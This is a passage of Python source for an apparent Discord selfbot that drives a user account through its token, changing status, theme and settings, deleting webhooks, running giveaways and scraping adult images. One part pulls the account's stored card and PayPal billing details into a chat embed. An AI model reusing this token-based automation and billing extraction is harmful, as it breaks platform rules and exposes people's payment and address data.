                    if x['type'] == 1:
                        cc_brand = x['brand']
                        cc_first = cc_digits.get(cc_brand)
                        cc_last = x['last_4']
                        cc_month = str(x['expires_month'])
                        cc_year = str(x['expires_year'])
                        
                        data = {
                            'Payment Type': 'Credit Card',
                            'Valid': not x['invalid'],
                            'CC Holder Name': name,
                            'CC Brand': cc_brand.title(),
                            'CC Number': ''.join(z if (i + 1) % 2 else z + ' ' for i, z in enumerate((cc_first if cc_first else '*') + ('*' * 11) + cc_last)),
                            'CC Exp. Date': ('0' + cc_month if len(cc_month) < 2 else cc_month) + '/' + cc_year[2:4],
                            'Address 1': address_1,
                            'Address 2': address_2 if address_2 else '',
                            'City': city,
                            'Postal Code': postal_code,
                            'State': state if state else '',
                            'Country': country,
                            'Default Payment Method': x['default']
                        }

                    elif x['type'] == 2:
                        data = {
                            'Payment Type': 'PayPal',
                            'Valid': not x['invalid'],
                            'PayPal Name': name,
                            'PayPal Email': x['email'],
                            'Address 1': address_1,
                            'Address 2': address_2 if address_2 else '',
                            'City': city,
                            'Postal Code': postal_code,
                            'State': state if state else '',
                            'Country': country,
                            'Default Payment Method': x['default']
                        }

                    billing_info.append(data)

                
                if len(billing_info) > 0:
                    if len(billing_info) == 1:
                        for x in billing_info:
                            for key, val in x.items():
                                if not val:
                                    continue
                                embed.add_field(name=key, value=val, inline=True)
                                
                    else:
                        for x in enumerate(billing_info):
                            for j, (key, val) in enumerate(x.items()):
                                if not val or j == 0:
                                    continue
                                embed.add_field(name=key, value=val, inline=True)

                embed.set_thumbnail(url=avatar_url)
                embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                await embed_or_codeblock(ctx, embed)



        except Exception:
            return

    @React.command(usage="delwebhook <Webhook URL>", description="Deletes a Webhook")
    async def delwebhook(ctx, webhook: str):
        
        try:
            async with httpx.AsyncClient() as client:
                await client.delete(webhook)

            embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='Delete Webhook',timestamp=embed_timestamp())
            embed.add_field(name=f'__üîó Deleted Webhook__', value=f'{webhook}', inline=True)
            embed.set_thumbnail(url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed)



        except Exception:
            return

    @React.command(usage="customstatus <Emoji> <Text>", description="Edits your status")
    async def customstatus(ctx, emoji, text: str):            
        
        try:
            async with httpx.AsyncClient() as client:
                await client.patch('https://canary.discordapp.com/api/v8/users/@me/settings', json={'custom_status': {"emoji_name": emoji.name, "emoji_id": emoji.id, "text": text}}, headers={'authorization': token, 'user-agent': 'Mozilla/5.0'})
                embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='User Status',timestamp=embed_timestamp())
                embed.add_field(name=f'New Custom Status', value=f'{emoji} {text}', inline=True)
                embed.set_thumbnail(url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                await embed_or_codeblock(ctx, embed)


        except Exception:
            pass
            async with httpx.AsyncClient() as client:
                await client.patch('https://canary.discordapp.com/api/v8/users/@me/settings', json={'custom_status': {"emoji_name": emoji, "text": text}}, headers={'authorization': token, 'user-agent': 'Mozilla/5.0'})
                embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='User Status',timestamp=embed_timestamp())
                embed.add_field(name=f'New Custom Status', value=f'{emoji} {text}', inline=True)
                embed.set_thumbnail(url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                await embed_or_codeblock(ctx, embed)



    @React.command(usage="online", description="Sets your status to online")
    async def online(ctx):
        
        try:
            async with httpx.AsyncClient() as client:
                await client.patch('https://canary.discordapp.com/api/v8/users/@me/settings', json={'status': 'online'}, headers={'authorization': token, 'user-agent': 'Mozilla/5.0'})
                embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='User Status',timestamp=embed_timestamp())
                embed.add_field(name=f'New Status', value='Online', inline=True)
                embed.set_thumbnail(url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                await embed_or_codeblock(ctx, embed)


        except Exception:
            return

    @React.command(usage="idle", description="Sets your status to idle")
    async def idle(ctx):
        
        try:
            async with httpx.AsyncClient() as client:
                await client.patch('https://canary.discordapp.com/api/v8/users/@me/settings', json={'status': 'idle'}, headers={'authorization': token, 'user-agent': 'Mozilla/5.0'})
                embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='User Status',timestamp=embed_timestamp())
                embed.add_field(name=f'New Status', value='Idle', inline=True)
                embed.set_thumbnail(url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                await embed_or_codeblock(ctx, embed)


        except Exception:
            return

    @React.command(usage="dnd", description="Sets your status to do not disturb")
    async def dnd(ctx):
        
        try:
            async with httpx.AsyncClient() as client:
                await client.patch('https://canary.discordapp.com/api/v8/users/@me/settings', json={'status': 'dnd'}, headers={'authorization': token, 'user-agent': 'Mozilla/5.0'})
                embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='User Status',timestamp=embed_timestamp())
                embed.add_field(name=f'New Status', value='Do not Disturb', inline=True)
                embed.set_thumbnail(url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                await embed_or_codeblock(ctx, embed)


        except Exception:
            return

    @React.command(usage="invisible", description="Sets your status to invisible")
    async def invisible(ctx):
        
        try:
            async with httpx.AsyncClient() as client:
                await client.patch('https://canary.discordapp.com/api/v8/users/@me/settings', json={'status': 'invisible'}, headers={'authorization': token, 'user-agent': 'Mozilla/5.0'})
                embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='User Status',timestamp=embed_timestamp())
                embed.add_field(name=f'New Status', value='Invisible', inline=True)
                embed.set_thumbnail(url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                await embed_or_codeblock(ctx, embed)


        except Exception:
            return
        
    @React.command(usage="darkmode", description="Changes your Discord theme to dark")
    async def darkmode(ctx):
        
        try:
            async with httpx.AsyncClient() as client:
                await client.patch('https://canary.discordapp.com/api/v8/users/@me/settings', json={'theme': "dark"}, headers={'authorization': token, 'user-agent': 'Mozilla/5.0'})
                embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='User Theme',timestamp=embed_timestamp())
                embed.add_field(name=f'New Theme', value='Dark', inline=True)
                embed.set_thumbnail(url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                await embed_or_codeblock(ctx, embed)


        except Exception:
            return
        
    @React.command(usage="lightmode", description="Changes your Discord theme to light")
    async def lightmode(ctx):
        
        try:
            async with httpx.AsyncClient() as client:
                await client.patch('https://canary.discordapp.com/api/v8/users/@me/settings', json={'theme': "light"}, headers={'authorization': token, 'user-agent': 'Mozilla/5.0'})
                embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='User Theme',timestamp=embed_timestamp())
                embed.add_field(name=f'New Theme', value='Light', inline=True)
                embed.set_thumbnail(url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                await embed_or_codeblock(ctx, embed)


        except Exception:
            return
        
        
    @React.listen()
    async def on_raw_reaction_add(payload):
        global giveaway_msg_id
        if payload.message_id == giveaway_msg_id:
            giveaway_entries.append(payload.user_id)
        
    @React.command(usage="giveaway <Seconds> <Winners> <Prize>", description="Starts a giveaway")
    async def giveaway(ctx, time: int, winners: int, *, prize: str):
        global giveaway_msg_id
        try:
            embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='üéâ **GIVEAWAY** üéâ', description='React to this message to enter!',timestamp=embed_timestamp())
            embed.add_field(name=f'__üéâ Prize__', value=f'{prize}', inline=False)
            embed.add_field(name=f'__‚è± Time in Seconds__', value=f'{time}s', inline=False)
            embed.add_field(name=f'__üéÅ Winners__', value=f'{winners}', inline=False)
            embed.set_thumbnail(url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            msg = await ctx.send(embed=embed)
            giveaway_msg_id = msg.id
            await msg.add_reaction('üéâ')
            await asyncio.sleep(time)
            giveaway_entries.pop(giveaway_entries.index(React.user.id))
            try:
                if winners == 1:
                    winner = random.choice(giveaway_entries)
                    await ctx.send(f"<@{winner}> has won the giveaway for **{prize}**! {msg.jump_url}")
                else:
                    users_who_won = []
                    if len(giveaway_entries) < winners:
                        await ctx.send(f"Could not determine winners for **{prize}**! {msg.jump_url}")
                        return
                    for j in range(0, winners):
                        def determine_winner():
                            new_winner = giveaway_entries[random.randint(0, len(giveaway_entries))]
                            if new_winner not in users_who_won:
                                users_who_won.append(new_winner)
                            else:
                                determine_winner()
                        
                        determine_winner()
                                
                    await ctx.send(f", ".join([f"<@{user_id}>" for user_id in users_who_won]) + f" have won the giveaway for **{prize}**! {msg.jump_url}")
                            
            except Exception:
                pass
                await ctx.send(f"Could not determine winner for **{prize}**! {msg.jump_url}")
            giveaway_msg_id = None
            giveaway_entries.clear()
        except Exception:
            pass
        
        
    @React.command(usage="messagedisplay <Compact/Cozy>", description="Changes your message display")
    async def messagedisplay(ctx, type: str):
        try:
            if type.lower() == 'compact': 
                async with httpx.AsyncClient() as client:
                    await client.patch('https://canary.discord.com/api/v8/users/@me/settings', json={'message_display_compact': 'true'}, headers={'authorization': token, 'user-agent': 'Mozilla/5.0'})
                    embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='User Settings',timestamp=embed_timestamp())
                    embed.add_field(name=f'Message Display', value='Compact', inline=True)
                    embed.set_thumbnail(url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                    embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                    embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                    await embed_or_codeblock(ctx, embed)


            elif type.lower() == 'cozy':
                async with httpx.AsyncClient() as client:
                    await client.patch('https://canary.discord.com/api/v8/users/@me/settings', json={'message_display_compact': 'false'}, headers={'authorization': token, 'user-agent': 'Mozilla/5.0'})
                    embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='User Settings',timestamp=embed_timestamp())
                    embed.add_field(name=f'Message Display', value='Cozy', inline=True)
                    embed.set_thumbnail(url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                    embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                    embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                    await embed_or_codeblock(ctx, embed)


        except Exception:
            return
        
    @React.command(usage="developer <Enable/Disable>", description="Enables/Disables Discord Developer mode")
    async def developer(ctx, toggle: str):
        try:
            if toggle.lower() == 'enable': 
                async with httpx.AsyncClient() as client:
                    await client.patch('https://canary.discord.com/api/v8/users/@me/settings', json={'developer_mode': 'true'}, headers={'authorization': token, 'user-agent': 'Mozilla/5.0'})
                    embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='User Settings',timestamp=embed_timestamp())
                    embed.add_field(name=f'Developer Mode', value='Enabled', inline=True)
                    embed.set_thumbnail(url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                    embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                    embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                    await embed_or_codeblock(ctx, embed)


            elif toggle.lower() == 'disable':
                async with httpx.AsyncClient() as client:
                    await client.patch('https://canary.discord.com/api/v8/users/@me/settings', json={'developer_mode': 'false'}, headers={'authorization': token, 'user-agent': 'Mozilla/5.0'})
                    embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='User Settings',timestamp=embed_timestamp())
                    embed.add_field(name=f'Developer Mode', value='Disabled', inline=True)
                    embed.set_thumbnail(url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                    embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                    embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                    await embed_or_codeblock(ctx, embed)


        except Exception:
            return

    @React.command(usage="calc <Equation>", description="Calculates the mathematical answer of an equation")
    async def calc(ctx, *, expression):

        result = requests.get(f"https://api.mathjs.org/v4/?expr={urllib.parse.quote(expression)}").text

        embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='Calculator',timestamp=embed_timestamp())
        embed.add_field(name=f'Equation', value=f'```{expression}```', inline=False)
        embed.add_field(name=f'Answer', value=f'{result}', inline=False)
        embed.set_thumbnail(url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)

    @React.command(usage="trivia", description="Shows a trivia question")
    async def trivia(ctx):

        try:
            result = requests.get(f"https://opentdb.com/api.php?amount=1").json()

            embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='Trivia',timestamp=embed_timestamp())
            base = result['results'][0]
            category = html_parser.unescape(base['category'])
            difficulty = html_parser.unescape(base['difficulty'])
            question = html_parser.unescape(base['question'])
            answer = html_parser.unescape(base['correct_answer'])
            incorrect_answers = html_parser.unescape(base['incorrect_answers'])

            embed.add_field(name=f'Category', value=f'{category}', inline=False)
            embed.add_field(name=f'Difficulty', value=f'{difficulty.capitalize()}', inline=True)
            embed.add_field(name=f'Question', value=f'{question}', inline=False)
            embed.add_field(name=f'Possible Answers', value=f', '.join([f"{a}, {answer}" for a in incorrect_answers]), inline=False)
            embed.add_field(name=f'Answer', value=f'||{answer}||', inline=False)
            embed.set_thumbnail(url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await ctx.send(embed=embed)
        except Exception as e:
            print(e)



    @React.command(usage="rule34", description="Sends a random rule34.xxx image")
    async def rule34(ctx, tag=None):
        if tag is None:
            try:
                request = requests.get(f'https://rule34.xxx/index.php?page=post&s=random')
                soup = BeautifulSoup(request.content, 'html.parser')
                link = soup.find(id="image").get("src")
                embed= discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Rule34',timestamp=embed_timestamp())
                embed.set_image(url=link)
                embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
